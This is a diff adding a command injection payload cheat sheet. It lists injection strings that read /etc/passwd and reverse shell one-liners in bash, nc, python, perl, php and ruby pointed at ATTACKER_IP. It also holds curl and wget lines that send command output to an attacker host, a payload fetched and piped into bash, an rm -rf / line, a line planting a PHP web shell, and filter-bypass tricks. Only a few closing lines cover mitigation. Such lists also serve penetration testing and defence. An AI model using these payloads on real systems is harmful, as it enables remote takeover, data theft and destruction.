@@ -1,0 +1,57 @@
+Command Injection Payloads:
+
+### Basic Payloads:
+- ; id
+- && whoami
+- | uname -a
+- ; ls -la
+- && pwd
+- | cat /etc/passwd
+- ; whoami && id
+- && echo "test" && ls
+
+### Command Separators:
+- ; (semicolon)
+- && (and)
+- || (or)
+- | (pipe)
+- `command` (backticks)
+- $(command) (command substitution)
+
+### Reverse Shell Payloads:
+- bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
+- nc -e /bin/sh ATTACKER_IP PORT
+- python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+- perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+- php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
+- ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
+### Blind Injection Payloads:
+- ping -c 5 127.0.0.1
+- sleep 5
+- nslookup ATTACKER_DOMAIN
+- curl http://ATTACKER_IP/$(whoami)
+- wget --post-data="$(id)" http://ATTACKER_IP/
+
+### Bypass Techniques:
+- Use encoding: %3B (for ;)
+- Case variation: ;Id
+- Inline execution: $(id)
+- Background execution: command &
+- Null byte termination: ; id%00
+
+### Advanced Payloads:
+- ; rm -rf / (dangerous, for testing)
+- && wget http://ATTACKER_IP/shell.sh && bash shell.sh
+- | base64 -d <<< encoded_command | bash
+- ; echo 'evil code' > /var/www/html/shell.php
+
+### Detection and Testing:
+- Test with: ; echo vulnerable
+- Check for output in response
+- Use time-based delays for blind injection
+
+### Mitigation Notes:
+- Always sanitize and escape user input
+- Use parameterized commands or APIs
+- Implement input validation and whitelisting
